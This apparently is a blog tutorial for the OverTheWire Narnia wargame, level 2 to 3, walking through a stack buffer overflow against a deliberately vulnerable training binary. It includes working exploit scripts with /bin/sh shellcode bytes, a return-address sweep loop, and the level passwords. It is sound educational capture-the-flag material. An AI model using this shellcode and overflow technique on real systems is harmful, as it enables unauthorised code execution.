---
date: 2023-08-20 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Narnia Level 2 → 3 tutorial!!"
permalink: /posts/overTheWire-Narnia-Level-2-to-3/
tags: [overthewire, narnia, pwn, overflow, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Narnia Level 2 → 3!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Narnia level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Narnia-Level-1-to-2/' | relative_url }}">← Previous: Level 1 → 2</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/narnia/narnia3.html" target="_blank" rel="noopener">Official (Level 3) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Narnia-Level-3-to-4/' | relative_url }}">Next: Level 3 → 4 →</a>
  </div>
</nav>

## Login

Log in with the password from Level 1 → 2 (my run gave `5agRAXeBdG`).

```bash
ssh narnia2@narnia.labs.overthewire.org -p 2226
# password: 5agRAXeBdG
````

> **Why?** Each Narnia stage is a separate UNIX user. To solve Level 1 → 2 you must become `narnia2`.

---

## Task

Binary to exploit: **`/narnia/narnia2`**

The program copies **argv\[1]** into a **128-byte local buffer with `strcpy`** — no bounds checks. Overflow past the buffer to **overwrite the saved return address (RET)** and redirect execution into your shellcode.

> **Why?** On 32-bit, the stack frame holds `[buf(128)] [saved EBP (4)] [saved RET (4)]`. If we write ≥132 bytes, `RET` becomes ours.

---

## A little bit of Theory

* **Offset to RET:** `128 + 4 = 132` bytes.
* **Payload layout (argv, not stdin):**
  `104×NOP` + **23-byte `/bin/sh` shellcode** + `5×NOP` = **132 bytes**, then **RET** pointing **back into the NOP block**.
* **Stability:** Stack addresses shift (ASLR) and the environment size changes them too. Use `setarch i386 -R env -i` to **disable ASLR** and **clear env** so GDB and real runs match.
* **UTF-8 pitfall:** In Python 3, `print("\x90")` emits **UTF-8** (`0xC2 0x90`). Always write **raw bytes** with `sys.stdout.buffer.write(...)`.
* **RET must avoid `\x00`:** If the little-endian RET contains `\x00` (e.g., `…00`), your shell truncates the argument before overwrite → no control.

**Further reading**

* Aleph One — *Smashing The Stack For Fun And Profit*
* `man strcpy`, `man setarch`
* Exploit-DB Linux stack overflow & shellcode primers

---

## Solution

### 1) Verify the RET overwrite offset (132)

```bash
cd /narnia
gdb -q /narnia/narnia2 <<'GDB'
run $(python3 -c 'print("A"*132 + "BBBB")')
quit
GDB
```

> **Why?** Seeing `EIP=0x42424242` (BBBB) confirms the exact offset to RET is 132.

---

### 2) Calibrate on the **exact layout** (ASLR-off + empty env)

Start GDB with the wrapper so the stack matches the real run:

```bash
setarch i386 -R env -i gdb -q /narnia/narnia2
```

Run with the **exact** 132-byte pre-RET layout (single line):

```
run $(python3 -c 'import sys;S=b"\x90"*104;H=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";P=b"\x90"*5;sys.stdout.buffer.write(S+H+P+b"BBBB")')
```

Dump the stack where your buffer sits:

```
x/200bx $esp-240
```

> **Why?** You’ll **see** a big `0x90` block (NOP sled) followed by the shellcode bytes. **Pick a RET inside that NOP block** (or the first byte of the shellcode). Be sure the chosen address has **no `\x00` when packed little-endian**.

---

### 3) Pop the shell (same wrapper, argv — not stdin)

```bash
setarch i386 -R env -i /narnia/narnia2 "$(python3 - <<'PY'
import sys,struct
SLED  = b"\x90"*104
SHELL = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
         b"\x68\x2f\x62\x69\x6e"
         b"\x89\xe3\x89\xc1\x89\xc2"
         b"\xb0\x0b\xcd\x80")
PAD   = b"\x90"*5                    # 104 + 23 + 5 = 132
RET   = 0xFFFFDD0C                   # ← replace with YOUR address (avoid ...00)
sys.stdout.buffer.write(SLED + SHELL + PAD + struct.pack('<I', RET))
PY
)"
```

> **Why?** Same layout + same process wrapper ⇒ the RET you picked lands inside your sled and slides into the shellcode.

Grab the next password:

```bash
whoami
# narnia3
cat /etc/narnia_pass/narnia3
```

---

## Password

> This is the password from **my** successful run; yours may differ based on the host snapshot. Replace this with your actual output.

```
vaeqeuzee
```

---

## Troubleshooting

* **`Illegal instruction` or just `Segmentation fault`**
  You likely jumped outside the sled. Re-do Step 2 and pick a RET clearly **inside** the `0x90` region you see in GDB under the wrapper.
  Also make sure every generator uses:

  ```python
  sys.stdout.buffer.write(b"...")
  ```

  (never `print("\x90"... )`)

* **Bash warns `ignored null byte in input`**
  Your RET contains `\x00` in little-endian (e.g., `…dd00` → `00 dd ff ff`). Choose an address ending in `…04, …08, …0c, …10, …14`, etc.

* **Still not landing? Sweep a tiny range** (same wrapper):

  ```bash
  for a in 0xffffdcf4 0xffffdcf8 0xffffdcfc 0xffffdd04 0xffffdd08 0xffffdd0c 0xffffdd10 0xffffdd14; do
    echo "[*] RET=$a"
    setarch i386 -R env -i /narnia/narnia2 "$(python3 - "$a" <<'PY'
  import sys,struct
  ret=int(sys.argv[1],16)
  SLED  = b"\x90"*104
  SHELL = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
           b"\x68\x2f\x62\x69\x6e"
           b"\x89\xe3\x89\xc1\x89\xc2"
           b"\xb0\x0b\xcd\x80")
  PAD   = b"\x90"*5
  sys.stdout.buffer.write(SLED + SHELL + PAD + struct.pack('<I', ret))
  PY
    )" && break
  done
  ```

* **Running from `~` says `./narnia2: No such file or directory`**
  Always `cd /narnia` and use `/narnia/narnia2`.

---

## Copy-paste quick run

```bash
# 1) Confirm RET offset = 132
gdb -q /narnia/narnia2 <<'GDB'
run $(python3 -c 'print("A"*132 + "BBBB")')
quit
GDB

# 2) Find a RET inside the sled (ASLR off + empty env)
setarch i386 -R env -i gdb -q /narnia/narnia2
# In GDB (single line):
# run $(python3 -c 'import sys;S=b"\x90"*104;H=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";P=b"\x90"*5;sys.stdout.buffer.write(S+H+P+b"BBBB")')
# then: x/200bx $esp-240  → pick an address inside the NOP block (avoid ...00)

# 3) Exploit with the same wrapper
setarch i386 -R env -i /narnia/narnia2 "$(python3 - <<'PY'
import sys,struct
SLED  = b"\x90"*104
SHELL = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
         b"\x68\x2f\x62\x69\x6e"
         b"\x89\xe3\x89\xc1\x89\xc2"
         b"\xb0\x0b\xcd\x80")
PAD   = b"\x90"*5
RET   = 0xFFFFDD0C  # replace with your chosen address
sys.stdout.buffer.write(SLED + SHELL + PAD + struct.pack('<I', RET))
PY
)"
whoami
cat /etc/narnia_pass/narnia3
```

---

**Congrats 🎉** You just executed a classic **stack buffer overflow** with a stable process layout and a calibrated RET. On to **Level 3 → 4**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

